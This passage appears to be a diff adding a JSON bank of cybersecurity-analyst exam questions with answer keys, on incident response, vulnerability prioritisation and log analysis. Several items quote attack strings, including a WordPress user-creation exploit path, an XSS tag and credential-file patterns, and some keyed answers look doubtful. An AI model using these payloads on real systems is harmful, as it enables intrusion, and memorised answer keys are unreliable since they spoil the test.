+                "id": "D",
+                "text": "STIX/TAXII"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "An analyst is remediating items associated with a recent incident. The analyst has isolated the vulnerability and is actively removing it from the system. Which of the following steps of the process does this describe?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Eradication"
+            },
+            {
+                "id": "B",
+                "text": "Recovery"
+            },
+            {
+                "id": "C",
+                "text": "Containment"
+            },
+            {
+                "id": "D",
+                "text": "Preparation"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "Joe, a leading sales person at an organization, has announced on social media that he is leaving his current role to start a new company that will compete with his current employer. Joe is soliciting his current employer's customers. However, Joe has not resigned or discussed this with his current supervisor yet. Which of the following would be the best action for the incident response team to recommend?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Isolate Joe's PC from the network"
+            },
+            {
+                "id": "B",
+                "text": "Reimage the PC based on standard operating procedures"
+            },
+            {
+                "id": "C",
+                "text": "Initiate a remote wipe of Joe's PC using mobile device management"
+            },
+            {
+                "id": "D",
+                "text": "Perform no action until HR or legal counsel advises on next steps"
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "The Chief Information Security Officer is directing a new program to reduce attack surface risks and threats as part of a zero trust approach. The IT security team is required to come up with priorities for the program. Which of the following is the best priority based on common attack frameworks?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Reduce the administrator and privileged access accounts"
+            },
+            {
+                "id": "B",
+                "text": "Employ a network-based IDS"
+            },
+            {
+                "id": "C",
+                "text": "Conduct thorough incident response"
+            },
+            {
+                "id": "D",
+                "text": "Enable SSO to enterprise applications"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "During an extended holiday break, a company suffered a security incident. This information was properly relayed to appropriate personnel in a timely manner and the server was up to date and configured with appropriate auditing and logging. The Chief Information Security Officer wants to find out precisely what happened. Which of the following actions should the analyst take first?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Clone the virtual server for forensic analysis"
+            },
+            {
+                "id": "B",
+                "text": "Log m to the affected server and begin analysis of the logs"
+            },
+            {
+                "id": "C",
+                "text": "Restore from the last known-good backup to confirm there was no loss of connectivity"
+            },
+            {
+                "id": "D",
+                "text": "Shut down the affected server immediately"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "A systems administrator is reviewing after-hours traffic flows from data-center servers and sees regular outgoing HTTPS connections from one of the servers to a public IP address. The server should not be making outgoing connections after hours. Looking closer, the administrator sees this traffic pattern around the clock during work hours as well. Which of the following is the most likely explanation?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "C2 beaconing activity"
+            },
+            {
+                "id": "B",
+                "text": "Data exfiltration"
+            },
+            {
+                "id": "C",
+                "text": "Anomalous activity on unexpected ports"
+            },
+            {
+                "id": "D",
+                "text": "Network host IP address scanning"
+            },
+            {
+                "id": "E",
+                "text": "A rogue network device"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "New employees in an organization have been consistently plugging in personal webcams despite the company policy prohibiting use of personal devices. The SOC manager discovers that new employees are not aware of the company policy. Which of the following will the SOC manager most likely recommend to help ensure new employees are accountable for following the company policy?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Human resources must email a copy of a user agreement to all new employees"
+            },
+            {
+                "id": "B",
+                "text": "Supervisors must get verbal confirmation from new employees indicating they have read the user agreement"
+            },
+            {
+                "id": "C",
+                "text": "All new employees must take a test about the company security policy during the onboardmg process"
+            },
+            {
+                "id": "D",
+                "text": "All new employees must sign a user agreement to acknowledge the company security policy"
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "An analyst has been asked to validate the potential risk of a new ransomware campaign that the Chief Financial Officer read about in the newspaper. The company is a manufacturer of a very small spring used in the newest fighter jet and is a critical piece of the supply chain for this aircraft. Which of the following would be the best threat intelligence source to learn about this new campaign?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Information sharing organization"
+            },
+            {
+                "id": "B",
+                "text": "Blogs/forums"
+            },
+            {
+                "id": "C",
+                "text": "Cybersecurity incident response team"
+            },
+            {
+                "id": "D",
+                "text": "Deep/dark web"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "An incident response team finished responding to a significant security incident. The management team has asked the lead analyst to provide an after-action report that includes lessons learned. Which of the following is the most likely reason to include lessons learned?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "To satisfy regulatory requirements for incident reporting"
+            },
+            {
+                "id": "B",
+                "text": "To hold other departments accountable"
+            },
+            {
+                "id": "C",
+                "text": "To identify areas of improvement in the incident response process"
+            },
+            {
+                "id": "D",
+                "text": "To highlight the notable practices of the organization's incident response team"
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "A vulnerability management team is unable to patch all vulnerabilities found during their weekly scans. Using the third-party scoring system described below, the team patches the most urgent vulnerabilities:",
+            "image": "images/question60.png",
+            "footer": "Which of the following vulnerabilities should be patched first, given the above third-party scoring system?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "InLoud:\n    Cobain: Yes -\n    Grohl: No -\n    Novo: Yes -\n    Smear: Yes -\n    Channing: No"
+            },
+            {
+                "id": "B",
+                "text": "TSpirit:\n    Cobain: Yes -\n    Grohl: Yes -\n    Novo: Yes -\n    Smear: No -\n    Channing: No"
+            },
+            {
+                "id": "C",
+                "text": "ENameless:\n    Cobain: Yes -\n    Grohl: No -\n    Novo: Yes -\n    Smear: No -\n    Channing: No"
+            },
+            {
+                "id": "D",
+                "text": "PBleach:\n    Cobain: Yes -\n    Grohl: No -\n    Novo: No -\n    Smear: No -\n    Channing: Yes"
+            }
+        ],
+        "answer": "B"
+    },
+    {
+        "question": {
+            "text": "A user downloads software that contains malware onto a computer that eventually infects numerous other systems. Which of the following has the user become?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Hacktivist"
+            },
+            {
+                "id": "B",
+                "text": "Advanced persistent threat"
+            },
+            {
+                "id": "C",
+                "text": "Insider threat"
+            },
+            {
+                "id": "D",
+                "text": "Script kiddie"
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "An organization has activated the CSIRT. A security analyst believes a single virtual server was compromised and immediately isolated from the network. Which of the following should the CSIRT conduct next?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Take a snapshot of the compromised server and verify its integrity"
+            },
+            {
+                "id": "B",
+                "text": "Restore the affected server to remove any malware"
+            },
+            {
+                "id": "C",
+                "text": "Contact the appropriate government agency to investigate"
+            },
+            {
+                "id": "D",
+                "text": "Research the malware strain to perform attribution"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "During an incident, an analyst needs to acquire evidence for later investigation. Which of the following must be collected first in a computer system, related to its volatility level?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Disk contents"
+            },
+            {
+                "id": "B",
+                "text": "Backup data"
+            },
+            {
+                "id": "C",
+                "text": "Temporary files"
+            },
+            {
+                "id": "D",
+                "text": "Running processes"
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "A security analyst is trying to identify possible network addresses from different source networks belonging to the same company and region. Which of the following shell script functions could help achieve the goal?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "function w() { a=$(ping -c 1 $1 | awk-F ”/” ’END{print $1}’) && echo “$1 | $a” }"
+            },
+            {
+                "id": "B",
+                "text": "function x() { b=traceroute -m 40 $1 | awk ’END{print $1}’) && echo “$1 | $b” }"
+            },
+            {
+                "id": "C",
+                "text": "function y() { dig $(dig -x $1 | grep PTR | tail -n 1 | awk -F ”.in-addr” ’{print $1}’).origin.asn.cymru.com TXT +short }"
+            },
+            {
+                "id": "D",
+                "text": "function z() { c=$(geoiplookup$1) && echo “$1 | $c” }"
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "A security analyst is writing a shell script to identify IP addresses from the same country. Which of the following functions would help the analyst achieve the objective?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "function w() { info=$(ping -c 1 $1 | awk -F “/” ‘END{print $1}’) && echo “$1 | $info” }"
+            },
+            {
+                "id": "B",
+                "text": "function x() { info=$(geoiplookup $1) && echo “$1 | $info” }"
+            },
+            {
+                "id": "C",
+                "text": "function y() { info=$(dig -x $1 | grep PTR | tail -n 1 ) && echo “$1 | $info” }"
+            },
+            {
+                "id": "D",
+                "text": "function z() { info=$(traceroute -m 40 $1 | awk ‘END{print $1}’) && echo “$1 | $info” }"
+            }
+        ],
+        "answer": "B"
+    },
+    {
+        "question": {
+            "text": "A security analyst obtained the following table of results from a recent vulnerability assessment that was conducted against a single web server in the environment:",
+            "image": "images/question66.png",
+            "footer": "Which of the following should be completed first to remediate the findings?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Ask the web development team to update the page contents"
+            },
+            {
+                "id": "B",
+                "text": "Add the IP address allow listing for control panel access"
+            },
+            {
+                "id": "C",
+                "text": "Purchase an appropriate certificate from a trusted root CA"
+            },
+            {
+                "id": "D",
+                "text": "Perform proper sanitization on all fields"
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "While reviewing web server logs, an analyst notices several entries with the same time stamps, but all contain odd characters in the request line. Which of the following steps should be taken next?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Shut the network down immediately and call the next person in the chain of command."
+            },
+            {
+                "id": "B",
+                "text": "Determine what attack the odd characters are indicative of."
+            },
+            {
+                "id": "C",
+                "text": "Utilize the correct attack framework and determine what the incident response will consist of."
+            },
+            {
+                "id": "D",
+                "text": "Notify the local law enforcement for incident response."
+            }
+        ],
+        "answer": "B"
+    },
+    {
+        "question": {
+            "text": "A security team conducts a lessons-learned meeting after struggling to determine who should conduct the next steps following a security event. Which of the following should the team create to address this issue?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Service-level agreement"
+            },
+            {
+                "id": "B",
+                "text": "Change management plan"
+            },
+            {
+                "id": "C",
+                "text": "Incident response plan"
+            },
+            {
+                "id": "D",
+                "text": "Memorandum of understanding"
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "A cybersecurity analyst notices unusual network scanning activity coming from a country that the company does not do business with. Which of the following is the best mitigation technique?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Geoblock the offending source country."
+            },
+            {
+                "id": "B",
+                "text": "Block the IP range of the scans at the network firewall."
+            },
+            {
+                "id": "C",
+                "text": "Perform a historical trend analysis and look for similar scanning activity."
+            },
+            {
+                "id": "D",
+                "text": "Block the specific IP address of the scans at the network firewall."
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "An analyst has received an IPS event notification from the SIEM stating an IP address, which is known to be malicious, has attempted to exploit a zero-day vulnerability on several web servers. The exploit contained the following snippet:\n    /wp-json/trx_addons/V2/get/sc_layout?sc=wp_insert_user&role=administrator",
+            "imgPath": "",
+            "footer": "Which of the following controls would work best to mitigate the attack represented by this snippet?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Limit user creation to administrators only."
+            },
+            {
+                "id": "B",
+                "text": "Limit layout creation to administrators only."
+            },
+            {
+                "id": "C",
+                "text": "Set the directory trx_addons to read only for all users."
+            },
+            {
+                "id": "D",
+                "text": "Set the directory V2 to read only for all users."
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "A penetration tester submitted data to a form in a web application, which enabled the penetration tester to retrieve user credentials. Which of the following should be recommended for remediation of this application vulnerability?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Implementing multifactor authentication on the server OS"
+            },
+            {
+                "id": "B",
+                "text": "Hashing user passwords on the web application"
+            },
+            {
+                "id": "C",
+                "text": "Performing input validation before allowing submission"
+            },
+            {
+                "id": "D",
+                "text": "Segmenting the network between the users and the web server"
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "A cybersecurity team lead is developing metrics to present in the weekly executive briefs. Executives are interested in knowing how long it takes to stop the spread of malware that enters the network. Which of the following metrics should the team lead include in the briefs?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Mean time between failures"
+            },
+            {
+                "id": "B",
+                "text": "Mean time to detect"
+            },
+            {
+                "id": "C",
+                "text": "Mean time to remediate"
+            },
+            {
+                "id": "D",
+                "text": "Mean time to contain"
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "An employee accessed a website that caused a device to become infected with invasive malware. The incident response analyst has:\n    • created the initial evidence log.\n    • disabled the wireless adapter on the device.\n    • interviewed the employee, who was unable to identify the website that was accessed.\n    • reviewed the web proxy traffic logs.",
+            "imgPath": "",
+            "footer": "Which of the following should the analyst do to remediate the infected device?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Update the system firmware and reimage the hardware."
+            },
+            {
+                "id": "B",
+                "text": "Install an additional malware scanner that will send email alerts to the analyst."
+            },
+            {
+                "id": "C",
+                "text": "Configure the system to use a proxy server for Internet access."
+            },
+            {
+                "id": "D",
+                "text": "Delete the user profile and restore data from backup."
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "A cloud team received an alert that unauthorized resources were being auto-provisioned. After investigating, the team suspects that cryptomining is occurring. Which of the following indicators would most likely lead the team to this conclusion?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "High GPU utilization"
+            },
+            {
+                "id": "B",
+                "text": "Bandwidth consumption"
+            },
+            {
+                "id": "C",
+                "text": "Unauthorized changes"
+            },
+            {
+                "id": "D",
+                "text": "Unusual traffic spikes"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "A company’s security team is updating a section of the reporting policy that pertains to inappropriate use of resources (e.g., an employee who installs cryptominers on workstations in the office). Besides the security team, which of the following groups should the issue be escalated to first in order to comply with industry best practices?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Help desk"
+            },
+            {
+                "id": "B",
+                "text": "Law enforcement"
+            },
+            {
+                "id": "C",
+                "text": "Legal department"
+            },
+            {
+                "id": "D",
+                "text": "Board member"
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "Given the following CVSS string:\n    CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+            "imgPath": "",
+            "footer": "Which of the following attributes correctly describes this vulnerability?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "A user is required to exploit this vulnerability."
+            },
+            {
+                "id": "B",
+                "text": "The vulnerability is network based."
+            },
+            {
+                "id": "C",
+                "text": "The vulnerability does not affect confidentiality."
+            },
+            {
+                "id": "D",
+                "text": "The complexity to exploit the vulnerability is high."
+            }
+        ],
+        "answer": "B"
+    },
+    {
+        "question": {
+            "text": "A cryptocurrency service company is primarily concerned with ensuring the accuracy of the data on one of its systems. A security analyst has been tasked with prioritizing vulnerabilities for remediation for the system. The analyst will use the following CVSSv3.1 impact metrics for prioritization:",
+            "image": "images/question77.png",
+            "footer": "Which of the following vulnerabilities should be prioritized for remediation?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "1"
+            },
+            {
+                "id": "B",
+                "text": "2"
+            },
+            {
+                "id": "C",
+                "text": "3"
+            },
+            {
+                "id": "D",
+                "text": "4"
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "Patches for two highly exploited vulnerabilities were released on the same Friday afternoon. Information about the systems and vulnerabilities is shown in the tables below:",
+            "image": "images/question78.png",
+            "footer": "Which of the following should the security analyst prioritize for remediation?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "rogers"
+            },
+            {
+                "id": "B",
+                "text": "brady"
+            },
+            {
+                "id": "C",
+                "text": "brees"
+            },
+            {
+                "id": "D",
+                "text": "manning"
+            }
+        ],
+        "answer": "B"
+    },
+    {
+        "question": {
+            "text": "A security analyst must preserve a system hard drive that was involved in a litigation request. Which of the following is the best method to ensure the data on the device is not modified?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Generate a hash value and make a backup image."
+            },
+            {
+                "id": "B",
+                "text": "Encrypt the device to ensure confidentiality of the data."
+            },
+            {
+                "id": "C",
+                "text": "Protect the device with a complex password."
+            },
+            {
+                "id": "D",
+                "text": "Perform a memory scan dump to collect residual data"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "Which of the following best describes the goal of a tabletop exercise?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "To test possible incident scenarios and how to react properly"
+            },
+            {
+                "id": "B",
+                "text": "To perform attack exercises to check response effectiveness"
+            },
+            {
+                "id": "C",
+                "text": "To understand existing threat actors and how to replicate their techniques"
+            },
+            {
+                "id": "D",
+                "text": "To check the effectiveness of the business continuity plan"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "A virtual web server in a server pool was infected with malware after an analyst used the internet to research a system issue. After the server was rebuilt and added back into the server pool, users reported issues with the website, indicating the site could not be trusted. Which of the following is the most likely cause of the server issue?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "The server was configured to use SSL to securely transmit data."
+            },
+            {
+                "id": "B",
+                "text": "The server was supporting weak TLS protocols for client connections."
+            },
+            {
+                "id": "C",
+                "text": "The malware infected all the web servers in the pool."
+            },
+            {
+                "id": "D",
+                "text": "The digital certificate on the web server was self-signed."
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "A zero-day command injection vulnerability was published. A security administrator is analyzing the following logs for evidence of adversaries attempting to exploit the vulnerability:",
+            "image": "images/question82.png",
+            "footer": "Which of the following log entries provides evidence of the attempted exploit?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Log entry 1"
+            },
+            {
+                "id": "B",
+                "text": "Log entry 2"
+            },
+            {
+                "id": "C",
+                "text": "Log entry 3"
+            },
+            {
+                "id": "D",
+                "text": "Log entry 4"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "A security analyst needs to ensure that systems across the organization are protected based on the sensitivity of the content each system hosts. The analyst is working with the respective system owners to help determine the best methodology that seeks to promote confidentiality, availability, and integrity of the data being hosted. Which of the following should the security analyst perform first to categorize and prioritize the respective systems?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Interview the users who access these systems."
+            },
+            {
+                "id": "B",
+                "text": "Scan the systems to see which vulnerabilities currently exist."
+            },
+            {
+                "id": "C",
+                "text": "Configure alerts for vendor-specific zero-day exploits."
+            },
+            {
+                "id": "D",
+                "text": "Determine the asset value of each system."
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "A security analyst is reviewing the following alert that was triggered by FIM on a critical system:",
+            "image": "images/question84.png",
+            "footer": "Which of the following best describes the suspicious activity that is occurring?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "A fake antivirus program was installed by the user."
+            },
+            {
+                "id": "B",
+                "text": "A network drive was added to allow exfiltration of data."
+            },
+            {
+                "id": "C",
+                "text": "A new program has been set to execute on system start."
+            },
+            {
+                "id": "D",
+                "text": "The host firewall on 192.168.1.10 was disabled."
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "Which of the following best describes the document that defines the expectation to network customers that patching will only occur between 2:00 a.m. and 4:00 a.m.?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "SLA"
+            },
+            {
+                "id": "B",
+                "text": "LOI"
+            },
+            {
+                "id": "C",
+                "text": "MOU"
+            },
+            {
+                "id": "D",
+                "text": "KPI"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "A cybersecurity analyst is reviewing SIEM logs and observes consistent requests originating from an internal host to a blocklisted external server. Which of the following best describes the activity that is taking place?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Data exfiltration"
+            },
+            {
+                "id": "B",
+                "text": "Rogue device"
+            },
+            {
+                "id": "C",
+                "text": "Scanning"
+            },
+            {
+                "id": "D",
+                "text": "Beaconing"
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "An incident response team is working with law enforcement to investigate an active web server compromise. The decision has been made to keep the server running and to implement compensating controls for a period of time. The web service must be accessible from the internet via the reverse proxy and must connect to a database server. Which of the following compensating controls will help contain the adversary while meeting the other requirements? (Choose two).",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Drop the tables on the database server to prevent data exfiltration."
+            },
+            {
+                "id": "B",
+                "text": "Deploy EDR on the web server and the database server to reduce the adversary’s capabilities."
+            },
+            {
+                "id": "C",
+                "text": "Stop the httpd service on the web server so that the adversary can not use web exploits."
+            },
+            {
+                "id": "D",
+                "text": "Use microsegmentation to restrict connectivity to/from the web and database servers."
+            },
+            {
+                "id": "E",
+                "text": "Comment out the HTTP account in the /etc/passwd file of the web server."
+            },
+            {
+                "id": "F",
+                "text": "Move the database from the database server to the web server."
+            }
+        ],
+        "answer": "B,D"
+    },
+    {
+        "question": {
+            "text": "An incident response team member is triaging a Linux server. The output is shown below:",
+            "image": "images/question88.png",
+            "footer": "Which of the following is the adversary most likely trying to do?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Create a backdoor root account named zsh."
+            },
+            {
+                "id": "B",
+                "text": "Execute commands through an unsecured service account."
+            },
+            {
+                "id": "C",
+                "text": "Send a beacon to a command-and-control server."
+            },
+            {
+                "id": "D",
+                "text": "Perform a denial-of-service attack on the web server."
+            }
+        ],
+        "answer": "B"
+    },
+    {
+        "question": {
+            "text": "A SOC analyst identifies the following content while examining the output of a debugger command over a client-server application:\n    getConnection(database01,'alpha' ,'AxTv.127GdCx94GTd');",
+            "imgPath": "",
+            "footer": "Which of the following is the most likely vulnerability in this system?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Lack of input validation"
+            },
+            {
+                "id": "B",
+                "text": "SQL injection"
+            },
+            {
+                "id": "C",
+                "text": "Hard-coded credential"
+            },
+            {
+                "id": "D",
+                "text": "Buffer overflow"
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "A technician is analyzing output from a popular network mapping tool for a PCI audit:",
+            "image": "images/question90.png",
+            "footer": "Which of the following best describes the output?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "The host is not up or responding."
+            },
+            {
+                "id": "B",
+                "text": "The host is running excessive cipher suites."
+            },
+            {
+                "id": "C",
+                "text": "The host is allowing insecure cipher suites."
+            },
+            {
+                "id": "D",
+                "text": "The Secure Shell port on this host is closed."
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "A managed security service provider is having difficulty retaining talent due to an increasing workload caused by a client doubling the number of devices connected to the network. Which of the following would best aid in decreasing the workload without increasing staff?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "SIEM"
+            },
+            {
+                "id": "B",
+                "text": "XDR"
+            },
+            {
+                "id": "C",
+                "text": "SOAR"
+            },
+            {
+                "id": "D",
+                "text": "EDR"
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "An employee is suspected of misusing a company-issued laptop. The employee has been suspended pending an investigation by human resources. Which of the following is the best step to preserve evidence?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Disable the user’s network account and access to web resources."
+            },
+            {
+                "id": "B",
+                "text": "Make a copy of the files as a backup on the server."
+            },
+            {
+                "id": "C",
+                "text": "Place a legal hold on the device and the user’s network share."
+            },
+            {
+                "id": "D",
+                "text": "Make a forensic image of the device and create a SHA-1 hash."
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "An analyst receives threat intelligence regarding potential attacks from an actor with seemingly unlimited time and resources. Which of the following best describes the threat actor attributed to the malicious activity?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Insider threat"
+            },
+            {
+                "id": "B",
+                "text": "Ransomware group"
+            },
+            {
+                "id": "C",
+                "text": "Nation-state"
+            },
+            {
+                "id": "D",
+                "text": "Organized crime"
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "A systems analyst is limiting user access to system configuration keys and values in a Windows environment. Which of the following describes where the analyst can find these configuration items?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "config.ini"
+            },
+            {
+                "id": "B",
+                "text": "ntds.dit"
+            },
+            {
+                "id": "C",
+                "text": "Master boot record"
+            },
+            {
+                "id": "D",
+                "text": "Registry"
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "While reviewing web server logs, a security analyst found the following line:\n    < IMG SRC='vbscript:msgbox('test')' >",
+            "imgPath": "",
+            "footer": "Which of the following malicious activities was attempted?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Command injection"
+            },
+            {
+                "id": "B",
+                "text": "XML injection"
+            },
+            {
+                "id": "C",
+                "text": "Server-side request forgery"
+            },
+            {
+                "id": "D",
+                "text": "Cross-site scripting"
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "A security analyst at a company called ACME Commercial notices there is outbound traffic to a host IP that resolves to https://office365password.acme.co. The site’s standard VPN logon page is www.acme.com/logon. Which of the following is most likely true?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "This is a normal password change URL."
+            },
+            {
+                "id": "B",
+                "text": "The security operations center is performing a routine password audit."
+            },
+            {
+                "id": "C",
+                "text": "A new VPN gateway has been deployed."
+            },
+            {
+                "id": "D",
+                "text": "A social engineering attack is underway."
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "A security analyst is performing vulnerability scans on the network. The analyst installs a scanner appliance, configures the subnets to scan, and begins the scan of the network. Which of the following would be missing from a scan performed with this configuration?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Operating system version"
+            },
+            {
+                "id": "B",
+                "text": "Registry key values"
+            },
+            {
+                "id": "C",
+                "text": "Open ports"
+            },
+            {
+                "id": "D",
+                "text": "IP address"
+            }
+        ],
+        "answer": "B"
+    },
+    {
+        "question": {
+            "text": "A security analyst discovers an LFI vulnerability that can be exploited to extract credentials from the underlying host. Which of the following patterns can the security analyst use to search the web server logs for evidence of exploitation of that particular vulnerability?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "/etc/shadow"
+            },
+            {
+                "id": "B",
+                "text": "curl localhost"
+            },
+            {
+                "id": "C",
+                "text": "; printenv"
+            },
+            {
+                "id": "D",
+                "text": "cat /proc/self/"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "A company is in the process of implementing a vulnerability management program. Which of the following scanning methods should be implemented to minimize the risk of OT/ICS devices malfunctioning due to the vulnerability identification process?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Non-credentialed scanning"
+            },
+            {
+                "id": "B",
+                "text": "Passive scanning"
+            },
+            {
+                "id": "C",
+                "text": "Agent-based scanning"
+            },
+            {
+                "id": "D",
+                "text": "Credentialed scanning"
+            }
+        ],
+        "answer": "B"
+    },
+    {
+        "question": {
+            "text": "A company receives a penetration test report summary from a third party. The report summary indicates a proxy has some patches that need to be applied. The proxy is sitting in a rack and is not being used, as the company has replaced it with a new one. The CVE score of the vulnerability on the proxy is a 9.8. Which of the following best practices should the company follow with this proxy?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Leave the proxy as is."
+            },
+            {
+                "id": "B",
+                "text": "Decomission the proxy."
+            },
+            {
+                "id": "C",
+                "text": "Migrate the proxy to the cloud."
+            },
+            {
+                "id": "D",
+                "text": "Patch the proxy."
+            }
+        ],
+        "answer": "B"
+    }
+]
